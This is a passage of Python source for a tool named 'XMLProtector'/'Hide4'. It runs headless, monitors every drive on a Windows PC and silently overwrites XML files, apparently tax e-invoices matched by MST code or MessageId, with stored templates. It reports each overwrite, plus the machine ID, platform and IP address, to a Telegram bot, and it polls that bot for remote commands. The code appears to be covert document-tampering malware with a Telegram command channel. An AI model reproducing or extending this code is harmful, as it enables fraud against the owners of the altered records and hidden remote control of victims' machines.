                    self.processed.add(dest)
                    save_processed_files(self.processed)
                    return
                else:
                    logging.warning(f"Template file NOT FOUND for MST: {mst}, fallback to content overwrite")
            
            # Fallback: sử dụng smart template matching
            smart_template = find_template_instant(dst_content, dest)
            
            if smart_template:
                # Kiểm tra nếu nội dung khác nhau thì mới ghi đè
                if dst_content != smart_template:
                    # Fallback: ghi đè nội dung
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(smart_template)
                    logging.info(f"✅ SMART OVERWRITE CONTENT SUCCESS: {dest}")
                    
                    # Send Telegram notification for successful overwrite
                    file_name = os.path.basename(dest)
                    overwrite_msg = f"⚡ <b>Ghi Đè Thành Công (Content)</b>\n" \
                                   f"📄 File: {file_name}\n" \
                                   f"🏢 MST: {mst or 'Không xác định'}\n" \
                                   f"📂 Đường dẫn: {os.path.dirname(dest)}"
                    send_telegram_message(overwrite_msg)
                    
                    send_remote_log("Smart Overwrite Content Success", dest, once=False)
                    self.processed.add(dest)
                    save_processed_files(self.processed)
                else:
                    logging.info(f"🔄 Smart check: File already up-to-date: {dest}")
                    return
            else:
                # Fallback về logic cũ nếu smart không tìm được
                logging.warning(f"⚠️ Smart template not found, fallback to MessageId matching")
                
                # Logic cũ - xử lý message ID
                filename = Path(dest).stem
                match = re.match(r'^(.*?)(?: \(\d+\))?$', filename)
                if not match:
                    return
                msg_id = match.group(1).split('_')[-1]
                src = self.templates.get(msg_id)
                if not src:
                    logging.warning(f"⚠️ No template found for MessageId: {msg_id}")
                    return
                    
                with open(src, 'r', encoding='utf-8') as f: 
                    src_content = f.read()
                    
                if dst_content == src_content:
                    return  # Bỏ qua nếu nội dung giống nhau
                    
                shutil.copy2(src, dest)
                logging.info(f"✅ Fallback overwrite success: {src} → {dest}")
                send_remote_log("Fallback Overwrite Success", dest, once=False)
                self.processed.add(dest)
                save_processed_files(self.processed)
                
        except Exception as e:
            logging.error(f"❌ Ghi đè thất bại {dest}: {e}")
            send_remote_log(f"Overwrite failed: {str(e)}", dest, once=False)

def start_monitor():
    """Headless mode: log start và giám sát toàn PC."""
    send_remote_log("Phần mềm Hide4 khởi chạy", once=True)
    # add_to_startup()  # DISABLED to prevent duplicate processes

    # Khởi tạo Machine Management System
    init_machine_management()
    
    templates = get_templates()
    template_count = len(templates)
    
    # Send Telegram startup notification với Machine ID
    startup_msg = f"🛡️ <b>XMLProtector Khởi Động</b>\n" \
                  f"📁 Templates đã tải: {template_count}\n" \
                  f"🔍 Đang giám sát toàn bộ ổ đĩa\n" \
                  f"⚡ Ghi đè thông minh: SẴN SÀNG\n\n" \
                  f"🤖 <b>Machine Management:</b>\n" \
                  f"• Machine ID: <code>{MACHINE_ID}</code>\n" \
                  f"• Platform: {MACHINE_INFO.get('platform', 'Unknown')}\n" \
                  f"• IP: {MACHINE_INFO.get('ip_address', 'Unknown')}"
    send_telegram_message(startup_msg)
    
    tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }

    handler  = DownloadHandler(tpl_map)
    observer = Observer()
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    send_remote_log("Bắt đầu giám sát", ",".join(drives), once=True)
    
    # Setup Telegram bot với exclusive access
    if get_bot_info():
        claim_bot_exclusive()
        clear_telegram_webhook()
        reset_telegram_updates()  # Flush old updates including callbacks
        time.sleep(3)  # Wait for complete setup
        logging.info("🚀 Telegram bot ready - callbacks should work now!")
    else:
        logging.error("❌ Telegram bot không khả dụng - tắt bot functions")

    try:
        # Main loop với command processing tối ưu
        command_check_interval = 0
        machine_status_interval = 0
        while True:
            time.sleep(0.5)  # Giảm từ 1s xuống 0.5s để phản hồi nhanh hơn
            
            # Kiểm tra Telegram commands mỗi 2 giây thay vì 5 giây
            command_check_interval += 1
            if command_check_interval >= 4:  # 0.5s * 4 = 2s
                process_telegram_commands()
                command_check_interval = 0
            
            # Cập nhật machine status mỗi 5 phút
            machine_status_interval += 1
            if machine_status_interval >= 600:  # 0.5s * 600 = 5 phút
                update_machine_status()
                machine_status_interval = 0
                
    except KeyboardInterrupt:
        observer.stop()
        send_remote_log("Phần mềm đã tắt", once=True)
    except Exception as e:
        logging.error(f"❌ Phần mềm gặp lỗi: {e}")
        send_remote_log("Phần mềm gặp lỗi", str(e), once=True)
    observer.join()

def launch_gui():
    """GUI mode: xem templates & log với control buttons."""
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("XMLProtector Control Panel")
    root.geometry("700x600")

    # Control buttons frame
    btn_frame = ctk.CTkFrame(root)
    btn_frame.pack(fill='x', padx=10, pady=10)
    
    def on_check_status():
        """Check status button handler."""
        try:
            check_status_report()
            messagebox.showinfo("Status", "Status report sent to Telegram!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send status: {e}")
    
    def on_destroy():
        """Destroy button handler."""
        result = messagebox.askyesno(
            "⚠️ DESTROY XMLProtector", 
            "Are you sure you want to COMPLETELY REMOVE XMLProtector?\n\n" +
            "This will:\n" +
            "• Remove from startup\n" +
            "• Delete all app data\n" +
            "• Terminate protection\n\n" +
            "THIS CANNOT BE UNDONE!"
        )
        if result:
            try:
                destroy_xmlprotector()
            except:
                # Process will terminate, so this might not show
                messagebox.showinfo("Destroyed", "XMLProtector has been removed!")
    
    # Control buttons
    status_btn = ctk.CTkButton(
        btn_frame, 
        text="📊 Check Status", 
        command=on_check_status,
        fg_color="#2563eb",
        width=150
    )
    status_btn.pack(side='left', padx=5)
    
    destroy_btn = ctk.CTkButton(
        btn_frame, 
        text="🚨 DESTROY", 
        command=on_destroy,
        fg_color="#dc2626",
        hover_color="#b91c1c",
        width=150
    )
    destroy_btn.pack(side='right', padx=5)

    # Templates list
    templates_label = ctk.CTkLabel(root, text="📁 Templates Loaded:")
    templates_label.pack(pady=(10,5))
    
    lb_tpl = Listbox(root, height=5)
    for p in get_templates():
        lb_tpl.insert(END, os.path.basename(p))
    lb_tpl.pack(fill='x', padx=10, pady=(0,10))

    # Log viewer
    log_label = ctk.CTkLabel(root, text="📄 Recent Activity Log:")
    log_label.pack(pady=(10,5))
    
    log_frame = ctk.CTkFrame(root)
    log_frame.pack(fill='both', expand=True, padx=10, pady=(0,10))

    lb_log = Listbox(log_frame)
    sb = Scrollbar(log_frame, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=5, pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()
if __name__ == '__main__' and '--test-log' in sys.argv:
    send_remote_log("Kiểm tra log từ Hide4", r"C:\temp\dummy.xml")
    sys.exit(0)